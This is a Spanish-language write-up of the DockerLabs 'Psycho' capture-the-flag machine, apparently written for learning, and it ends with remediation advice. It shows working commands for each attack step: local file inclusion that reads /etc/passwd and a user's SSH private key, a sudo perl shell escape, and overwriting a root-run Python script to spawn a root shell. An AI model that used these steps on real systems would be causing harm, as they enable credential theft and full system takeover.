
# Cómo iniciar el laboratorio

En este caso el writeup se va a tratar de una sola maquina individual, se la puede encontrar en [[https://dockerlabs.es/]] para poder realizar el CTF.

Una vez descargado el archivo de dockerlabs. Se ejecuta los siguientes comandos para correr la maquina:
```python
chmod +x auto_deploy.sh # da permisos de ejecucion al script.
sudo ./auto_deploy.sh psycho.tar # descarga docker y ejecuta la maquina.


                           ##        .            
                     ## ## ##       ==            
                  ## ## ## ##      ===            
              /""""""""""""""""\___/ ===          
         ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~  
              \______ o          __/              
                \    \        __/               
                 \____\______/                  
                                            
 ___  ____ ____ _  _ ____ ____ _    ____ ___  ____    
 |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__     
 |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___]    
                                           
                                       
  
Estamos desplegando la máquina vulnerable, espere un momento.  
  
Máquina desplegada, su dirección IP es --> 172.17.0.2

# El de arriba es el output esperado, mostrando 
```
# Fase de Reconocimiento

Ahora toca iniciar dicha fase con nmap, es una herramienta de terminal la cual nos permite conocer cuales son los puertos que estan abiertos en la maquina victima, ya sea por TCP/UDP, y los servicios que corren en dichos puertos.

```python
nmap -sCV -vvv -Pn -p- <IP-VICTIMA> -oN nmap.txt
```

para esto sirve cada parametro:
- sCV: Es una combinacion de 2 comando `-sC` que ejecuta un escaneo utilizando scripts por defecto para buscar vulnerabilidades comunes o informacion adicional, y `-sV` activa la deteccion de versiones buscando determinar que servicio exacto y que version de software se esta ejecutando.
- vvv: Define un nivel de triple verbosidad. Hace que se muestre de manera detallada y en tiempo real todo lo que se va descubriendo a medida que avanza el escaneo.
- Pn: Trata a la IP objetivo como si estuviera encendida y activa de forma obligatoria, evitando que el escaneo se detenga si el objetivo bloquea las solicitudes ICMP.
- -p-: Escanea los 65.535 puertos TCP existentes en lugar de limitarse a los 1.000 puertos principales que nmap usa por defecto.
- oN nmap.txt: Guarda la salida del comando en un `formato de texto normal (Normal output)` dentro del archivo `nmap.txt`

Este es el output del comando `nmap`:

```python
PORT   STATE SERVICE REASON         VERSION  
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   256 38:bb:36:a4:18:60:ee:a8:d1:0a:61:97:6c:83:06:05 (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLmfDz6T3XGKWifPXb0JRYMnpBIhNV4en6M+lkDFe1l/+EjBi+8MtlEy6EFgPI9TZ7aTybt2qudKJ8+r3wcsi8w=  
|   256 a3:4e:4f:6f:76:f2:ba:50:c6:1a:54:40:95:9c:20:41 (ED25519)  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHtGVi9ya8KY3fjIqNDQcC9RuW20liVFDd+uUEgllPzQ  
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))  
|_http-server-header: Apache/2.4.58 (Ubuntu)  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
|_http-title: 4You  
MAC Address: 3A:B9:98:54:EF:8F (Unknown)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Como se puede ver, estan abiertos 2 puertos, el 22(ssh) y el 80(http). Visitando la pagina web, me encuentro con lo siguiente:

![[psycho/Pasted image 20261019173347.png]]

A la hora de buscar clickear el boton "Book Your Visit" la pagina no realiza ninguna accion, al igual con el de "Join Now", asi que voy a proceder a hacer fuzzing con `gobuster`:

```go
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://172.17.0.2/ -x html,txt,js,py,db,php
```

El comando esta compuesto por:
- dir: sirve para descubrir directorios o archivos ocultos.
- w: el parametro indica el diccionario a usar.
- u: indica la url donde se va a realizar el fuzzing.
- x: permite agregar extensiones a cada palabra del diccionario, es decir si hay una palabra como `index`, al agregar la extension `html`, quedaria `index.html`.

El resultado de este comando es el siguiente:

```go
===============================================================  
Gobuster v3.8.2  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://172.17.0.2/  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.8.2  
[+] Extensions:              php,html,txt,js,py,db  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
index.php            (Status: 200) [Size: 2596]  
assets               (Status: 301) [Size: 309] [--> http://172.17.0.2/assets/]  
server-status        (Status: 403) [Size: 275]  
Progress: 1453487 / 1453487 (100.00%)  
===============================================================  
Finished  
===============================================================
```

# Evaluación de vulnerabilidades


Nada que podamos aprovechar, vamos a ver si se puede realizar un Local File Inclusion (LFI) con gobuster, con este comando:

```go
gobuster fuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://1  
72.17.0.2/index.php?FUZZ=test --exclude-length 2596
```

Se excluye las respuestas con un tamano de 2596 para filtar el ruido y tenemos este resultado:
```go
[Status=200] [Length=2582] [Word=secret] http://172.17.0.2/index.php?secret=test
```

Ahora toca ver si podemos sacar provecho de esta manera, para verlo de manera limpia se usara `curl`:

```python
curl http://172.17.0.2/index.php?secret=/etc/passwd
```

Lo que nos interesa nos dio la respuesta que es el contenido de `/etc/passwd`:
```python
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash  
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin  
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin  
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin  
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin  
vaxei:x:1001:1001:,,,:/home/vaxei:/bin/bash  
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin  
luisillo:x:1002:1002::/home/luisillo:/bin/sh
```

Esto nos quiere decir, que dicha maquina es vulnerable a un LFI.

# Fase de Explotación

Para esta fase, con la informacion que uno dispone de el contenido de `/etc/passwd` se va a buscar las llaves del servicio ssh (puerto 22) de los usuarios `vaxei` y `luisillo`. Para el caso de luisillo, no tuve suerte, pero en el caso de vaxei, si puedo imprimir su contenido con el LFI:

```python
curl http://172.17.0.2/index.php?secret=/home/vaxei/.ssh/id_rsa
```

Copiamos el contenido de dicha llave `id_rsa`:

```python
vi id_rsa
chmod 600 id_rsa # para que asi el dueno del archivo pueda escribir y leer nomas
```

Para conectarnos:

```python
ssh -i id_rsa vaxei@172.17.0.2 
```

- i: para proporcionar un archivo de identificacion que es la llave ssh.

# Escalada de Privilegios

Una vez adentro como el usuario `vaxei` ejecutamos `sudo -l` para ver que comando puede ejecutarse con otros usuarios y esta es la respuesta:

```python
Matching Defaults entries for vaxei on b66bebebf686:  
   env_reset, mail_badpass,  
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty  
  
User vaxei may run the following commands on b66bebebf686:  
   (luisillo) NOPASSWD: /usr/bin/perl
```

utilizando [[https://gtfobins.org/gtfobins/perl/]] uno puede ser `luisillo` aprovechandose del binario `perl`:

```python
sudo -u luisillo /usr/bin/perl -e 'exec "/bin/bash"'
```

ahora siendo `luisillo` hacemos `sudo -l`:

```python
Matching Defaults entries for luisillo on b66bebebf686:  
   env_reset, mail_badpass,  
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty  
  
User luisillo may run the following commands on b66bebebf686:  
   (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
```

Ahora podemos ver que para ejecutar el comando `/opt/paw.py` no nos piden contrasena y podemos imprimir su contenido:

Contenido de paw.py
```python
import subprocess  
import os  
import sys  
import time  
  
# F  
def dummy_function(data):  
   result = ""  
   for char in data:  
       result += char.upper() if char.islower() else char.lower()  
   return result  
  
# Código para ejecutar el script  
os.system("echo Ojo Aqui")  
  
# Simulación de procesamiento de datos  
def data_processing():  
   data = "This is some dummy data that needs to be processed."  
   processed_data = dummy_function(data)  
   print(f"Processed data: {processed_data}")  
  
# Simulación de un cálculo inútil  
def perform_useless_calculation():  
   result = 0  
   for i in range(1000000):  
       result += i  
   print(f"Useless calculation result: {result}")  
  
def run_command():  
   subprocess.run(['echo Hello!'], check=True)  
  
def main():  
   # Llamadas a funciones que no afectan el resultado final  
   data_processing()  
   perform_useless_calculation()  
      
   # Comando real que se ejecuta  
   run_command()  
  
if __name__ == "__main__":  
   main()
```

Nada que destacar aqui, pero haciendo un `ls -la` para ver los permisos de los usuarios y archivos ocultos, vemos esto:

```python
-rw-r--r-- 1 root root  967 Aug 10  2024 paw.py
```

se puede leer y escribir el archivo, entonces se puede eliminar dicho archivo sin necesidad de ser root, por ende podemos tratar de sustituir dicho archivo con  un script nuestro:

```python
rm paw.py && echo -e 'import os \nos.system("/bin/bash")' > paw.py
```

Este comando elimina el archivo original y escribe  adentro una shell para que sea ejecutada como root, sacada de [[https://gtfobins.org/gtfobins/python/]]

una vez hecho eso, ejecutamos el siguiente comando:

```python
luisillo@b66bebebf686:/opt$ sudo /usr/bin/python3 /opt/paw.py 
```

Esta seria la respuesta:

```
root@b66bebebf686:/opt# whoami  
root
```

y ya somos root, la máquina es concluida de manera correcta!

# Resumen/Reporte

Se pudo solucionar el ctf de Psycho, se hizo uso de la vulnerabilidad LFI(Local File Inclusion) para poder ganar acceso a la máquina victima, además también se aprovecho de malas configuraciones dentro de lo son los permisos de lectura/escritura de archivos por la parte de los usuarios,  mediante la lectura del archivo `id_rsa` del usuario vaxei. Se comprometio el usuario luisillo mediante el abuso de binarios con permisos de ejecución como otro usuario, en este caso, `luisillo`. Por último, se pudo ser `root` o administrador de sistema, mediante la mala configuración de permisos de archivos de `paw.py` donde se pudo usar dicho archivo para generar una shell como `root`.

# Recomendaciones

- Se debe evitar pasar la entrada enviada por el usuario a cualquier endpoint de sistema de archivos.
- Si lo anterior no es posible debido a cómo se debe manejar las rutas del aplicativo, se debe validar la entrada del usuario antes de procesarla, por ejemplo con una lista blanca(whitelist).
- Para archivos críticos o que serán compartidos con otros usuarios, se recomienda restringir los permisos de escritura, lectura y ejecución únicamente al propietario del archivo, limitando el acceso a otros usuarios a lectura solamente en caso de ser esencial. (chmod 640 o chmod 600).
